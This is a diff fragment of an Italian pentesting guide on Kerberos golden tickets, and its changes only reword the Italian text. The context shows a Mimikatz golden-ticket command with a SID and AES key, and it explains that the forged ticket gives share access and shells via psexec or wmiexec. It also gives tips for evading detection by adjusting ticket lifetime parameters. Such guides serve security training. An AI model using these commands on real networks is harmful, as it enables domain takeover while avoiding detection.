@@ -24,7 +24,7 @@ klist #List tickets in memory
 # Example using aes key
 kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
 ```
-**Una volta** che hai iniettato il **golden Ticket**, puoi accedere ai file condivisi **(C$)** ed eseguire servizi e WMI, quindi potresti usare **psexec** o **wmiexec** per ottenere una shell (sembra che non puoi ottenere una shell tramite winrm).
+**Una volta** che hai **iniettato il Golden Ticket**, puoi accedere ai file condivisi **(C$)** ed eseguire servizi e WMI, quindi puoi utilizzare **psexec** o **wmiexec** per ottenere una shell (sembra che non puoi ottenere una shell tramite winrm).
 
 ### Bypassare le rilevazioni comuni
 
@@ -32,7 +32,7 @@ I modi più frequenti per rilevare un golden ticket sono **ispezionando il traff
 
 `Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`
 
-Usa i parametri `/startoffset`, `/endin` e `/renewmax` per controllare l'offset di inizio, la durata e il numero massimo di rinnovi (tutti in minuti).
+Utilizza i parametri `/startoffset`, `/endin` e `/renewmax` per controllare l'offset di inizio, la durata e il numero massimo di rinnovi (tutti in minuti).
 ```
 Get-DomainPolicy | select -expand KerberosPolicy
 ```
